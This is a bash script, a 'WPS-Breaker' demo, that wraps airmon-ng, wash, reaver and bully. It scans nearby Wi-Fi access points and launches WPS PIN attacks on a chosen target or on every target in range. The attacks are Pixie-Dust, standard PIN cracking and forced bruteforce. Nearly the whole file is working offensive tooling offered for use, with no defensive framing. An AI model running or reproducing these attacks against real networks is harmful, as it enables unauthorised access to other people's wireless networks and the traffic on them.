#!/bin/bash

if [[ $3 == "" ]] || [[ $1 == "-h" ]] || [[ $1 == "--help" ]] || [[ ! $1 == "-i" ]] ; then
	echo ""
	echo "[!]		VAX WPS-Breaker "
	echo ""
	echo "[+] -h   --help		=>> show this message"
	echo "[+] -i   --interface	=>> choose an interface"
	echo "[+] -p   --pixie	=>> try pixie wps attack "
	echo "[+] -r   --reaver	=>> crack wps pin with reaver "
	echo "[+] -b   --bully	=>> crack wps pin with bully  "
	echo "[+] --bruteforce	=>> bruteforce wps bin using bully "
	echo "[+] usage. ./$0 -i <interface> <attacks to run> "
	echo "[+] eg. ./$0 -i wlan1 -p --bruteforce"
	exit
fi
if ! [[ `whoami` == "root" ]] ; then echo "[X] MUST RUN AS ROOT" ; exit 1 ; fi
clear
trap " echo "" ; kill -9 `pgrep wash` 2> /dev/null 1> /dev/null ; break " SIGINT SIGTERM
if [[ -d .workspace ]] ; then rm -rf .workspace ; fi
mkdir .workspace
cd .workspace
rm /etc/reaver/*.wpc 2> /dev/null
airmon-ng start $2 1> /dev/null
interface=$( ifconfig | grep $2 | awk {' print $1 '} | cut -d ":" -f1 )
wash -i $interface -o wash.txt 1> /dev/null &
normal='\e[0m'
blue='\e[1;94m'
red='\e[1;31m'
yellow='\e[1;33m'
ul='\e[1;4m'
purp='\e[1;35m'
green='\e[1;32m'
white='\e[97m'
function logo_1 {
echo -e "$yellow"
echo "		  	        ██╗   ██╗ █████╗ ██╗  ██╗"
echo "			        ██║   ██║██╔══██╗╚██╗██╔╝"
echo -e "	 $red	   	        ██║   ██║███████║ ╚███╔╝ v-0.1 ~Demo~ "
echo -e "		$yellow	        ╚██╗ ██╔╝██╔══██║ ██╔██╗ "
echo "			         ╚████╔╝ ██║  ██║██╔╝ ██╗"
echo -e "			          ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝"
echo -e "$purp				 CODED BY '${green}MAGDY MOUSTAFA${purp}'$normal"
}
function logo_2 {
echo -e "$red"
echo "				 ██▒   █▓ ▄▄▄      ▒██   ██▒"
echo "				▓██░   █▒▒████▄    ▒▒ █ █ ▒░"
echo "				 ▓██  █▒░▒██  ▀█▄  ░░  █   ░"
echo "				 ▒██ █░░░██▄▄▄▄██  ░ █ █ ▒ "
echo "				  ▒▀█░   ▓█   ▓██▒▒██▒ ▒██▒ v-0.1 ~Demo~"
echo "				  ░ ▐░   ▒▒   ▓▒█░▒▒ ░ ░▓ ░"
echo "				  ░ ░░    ▒   ▒▒ ░░░   ░▒ ░"
echo "		    		    ░░    ░   ▒    ░    ░  "
echo "				     ░        ░  ░ ░    ░  "
echo -e "$purp			  	  CODED BY '${blue}MAGDY MOUSTAFA${purp}'$normal"

}
arr[0]="logo_1"
arr[1]="logo_2"
rand="$[ $RANDOM % 2 ]"
logo="${arr[$rand]}"
sleep 1


function pixie_wps {
        echo -e "${red}`cat result.txt | tr -d '\000' | grep -v pin | grep WPS | sed 's/[[P]]/+]/g' | sort -u`"
        hash="$(cat result.txt | tr -d '\000' | grep -v pin | grep -e E-Hash |sed 's/[[P]]/+]/g')"
        pin="$(cat result.txt | tr -d '\000' | grep "WPS pin" | sed 's/\[Pixie-Dust\]//g')"
        if ! [[ $hash == "" ]] ; then
                echo -e  "${red}[+] Found E-hash .."
                echo -e "${green}$hash"
                echo -e "${white}$pin"
		if ! [[ $pin =~ "not found!" ]] ; then
			exit
		fi
        else
                echo -e "${yellow}[-] you aren't close enough to the access point $white"
	fi
}


while true ; do
	$logo
	x=1
	echo ""
	echo -e "${yellow} ID$red       BSSID   $blue           Channel  $green        WPS Version  $purp  WPS Locked $white         ESSID"
	echo -e "${yellow} --$red       -----   $blue           ------   $green        -----------  $purp  ---------- $white         -----"
	cat wash.txt | grep -ve "\-\-\-" -e "BSSID" > wps.txt
	awk {' print $1 '} wps.txt > bssid.txt
	awk {' print $2 '} wps.txt > channels.txt
	awk {' print $4 '} wps.txt > wpv.txt
        awk {' print $5 '} wps.txt > wpl.txt
        awk {' print $6" "$7" "$8" "$9" "$10" "$11 '} wps.txt > essid.txt
	list_lines=$( wc -l wps.txt | awk {' print $1 '} )
        for i in `seq 1 $list_lines` ; do
		if [ $x -lt 10 ] ; then
                	echo -ne "${yellow}[0$x] ${red}$( awk NR==$i bssid.txt ) \t \t"
		else
                        echo -ne "${yellow}[$x] ${red}$( awk NR==$i bssid.txt ) \t \t"
		fi
                echo -ne "${blue}$( awk NR==$i channels.txt )\t \t "
                echo -ne "${green}$( awk NR==$i wpv.txt )\t \t "
                echo -ne "${purp}$( awk NR==$i wpl.txt )\t \t "
                echo -e "${white}$( awk NR==$i essid.txt )\t \t"
                let x+=1
        done
	sleep 2
	clear
done
trap " echo "" ; kill -9 `pgrep reaver` 2> /dev/null 1> /dev/null ; airmon-ng stop $interface 1> /dev/null ; service network-manager restart ; exit " SIGINT SIGTERM
while true ; do
	echo -en "${red}[?]$green Choose Traget Number /$purp All $yellow / exit : $white " ; read target
        if [[ $target == "exit" ]] ; then exit ; fi
	if [[ $3 == "-p" ]] || [[ $3 == "--pixie" ]] || [[ $4 == "-p" ]] || [[ $4 == "--pixie" ]] || [[ $5 == "-p" ]] || [[ $5 == "--pixie" ]] ; then
                if [[ $target == "all" ]] ; then
                        for i in `seq 1 $list_lines` ; do
                                echo -e "$white[+] AP : $( awk NR==$i essid.txt )"
				timeout 100 bash -c "reaver -i $interface -b $( awk NR==$i bssid.txt ) -c $( awk NR==$i channels.txt ) -K 1 1> result.txt"
                                pixie_wps
                        done
                elif [ $target -lt `expr $list_lines + 1 ` ] ; then
                        echo -e "$white[+] AP : $( awk NR==$target essid.txt )"
			timeout 100 bash -c "reaver -i $interface -b $( awk NR==$target bssid.txt ) -c $( awk NR==$target channels.txt ) -K 1 1> result.txt"
                        pixie_wps
                else
                        echo -e "${red}[X] Wrong options , try again .. "
                fi
	fi
        if [[ $3 == "-b" ]] || [[ $3 == "--bully" ]] || [[ $4 == "-b" ]] || [[ $4 == "--bully" ]] || [[ $5 == "-b" ]] || [[ $5 == "--bully" ]] ; then
                if [[ $target == "all" ]] ; then
                        for i in `seq 1 $list_lines` ; do
                                echo -e "$white[+] AP : $( awk NR==$i essid.txt )"
	                        bully $interface -b $( awk NR==$i bssid.txt ) -c $( awk NR==$i channels.txt )
                        done
                else
                        bully $interface -b $( awk NR==$target bssid.txt ) -c $( awk NR==$target channels.txt )
                fi
        fi
        if [[ $3 == "-r" ]] || [[ $3 == "--reaver" ]] || [[ $4 == "-r" ]] || [[ $4 == "--reaver" ]] || [[ $5 == "-r" ]] || [[ $5 == "--reaver" ]] ; then
		if [[ $target == "all" ]] ; then
			for i in `seq 1 $list_lines` ; do
                                echo -e "$white[+] AP : $( awk NR==$i essid.txt )"
                		reaver -i $interface -b $( awk NR==$i bssid.txt ) -c $( awk NR==$i channels.txt ) | tr -d '\000' | grep -ve " WiFi Protected Setup" -e Copyright -e Soxrok2212
			done
		else
                	reaver -i $interface -b $( awk NR==$target bssid.txt ) -c $( awk NR==$target channels.txt ) | tr -d '\000' | grep -ve " WiFi Protected Setup" -e Copyright -e Soxrok2212
		fi
	fi
	if [[ $3 == "--bruteforce" ]] || [[ $4 == "--bruteforce" ]] || [[ $5 == "--bruteforce" ]] ; then
                if [[ $target == "all" ]] ; then
                        for i in `seq 1 $list_lines` ; do
                                echo -e "$white[+] AP : $( awk NR==$i essid.txt )"
                                bully $interface -b $( awk NR==$i bssid.txt ) -c $( awk NR==$i channels.txt ) -B --force
                        done
                else
                        bully $interface -b $( awk NR==$target bssid.txt ) -c $( awk NR==$target channels.txt ) -B --force
                fi
        fi

done
airmon-ng stop $interface 1> /dev/null ; service network-manager restart
